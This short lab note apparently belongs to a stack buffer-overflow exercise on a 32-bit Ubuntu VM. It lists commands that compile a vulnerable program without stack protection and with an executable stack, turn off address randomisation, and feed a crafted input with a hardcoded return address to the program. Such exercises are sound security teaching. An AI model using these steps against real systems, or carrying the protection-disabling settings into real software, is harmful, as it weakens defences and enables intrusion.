Program tested on Ubuntu 16.04.6 32bit VM

Compilation steps:
gcc ./vuln_program.c -fno-stack-protector -z execstack -static -o vuln_program
sudo sysctl -w kernel.randomize_va_space=0
objdump -d vuln_program > dump.txt
gedit dump.txt
gcc attack-string.c -o attack-string
./attack-string $'\x7c\x88\x04\x08' > attack.input (For my system target address is 0x0804887c)
./vuln_program <./attack.input
